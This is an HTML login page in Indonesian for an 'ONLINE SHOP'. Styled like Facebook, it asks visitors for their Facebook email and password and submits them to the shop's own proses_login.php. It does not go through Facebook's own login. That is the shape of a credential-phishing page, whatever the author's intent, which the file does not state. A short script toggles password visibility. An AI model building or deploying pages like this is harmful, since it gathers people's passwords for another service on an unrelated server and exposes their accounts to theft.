<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Facebook</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

  <div class="phone-frame">
    <!-- Header -->
    <div class="header animate-slide-down" style="background: linear-gradient(180deg, #3b5998, #2e4482);">
      <img src="logo.png" alt="Logo" class="logo">
      <h1>ONLINE SHOP</h1>
      <p>Login menggunakan akun Facebook</p>
    </div>

    <!-- Form Login Facebook -->
    <div class="login-box animate-fade-in">
      <h2>LOGIN FACEBOOK</h2>

      <form action="proses_login.php" method="POST">
        <input type="email" name="email" placeholder="Email Facebook" required>
        <div class="password-wrapper" style="position: relative; width: 100%;">
          <input type="password" name="password" id="password" placeholder="Password" required style="width: 100%; padding-right: 40px;">
          <i class="fas fa-eye" id="togglePassword" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #888;"></i>
        </div>
        <button type="submit" style="background-color:#3b5998;">Login</button>
      </form>

      <a href="login.php" class="forgot">Kembali ke login utama</a>
    </div>

    <!-- Gambar bawah -->
    <div class="footer-image animate-slide-up">
      <img src="cart.png" alt="Gambar belanja">
    </div>
  </div>

<script>
  const togglePassword = document.querySelector('#togglePassword');
const passwordField = document.querySelector('#password');

togglePassword.addEventListener('click', function () {
    const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordField.setAttribute('type', type);
    
    // Ganti ikon mata
    this.classList.toggle('fa-eye');
    this.classList.toggle('fa-eye-slash');
});
</script>

</body>
</html>
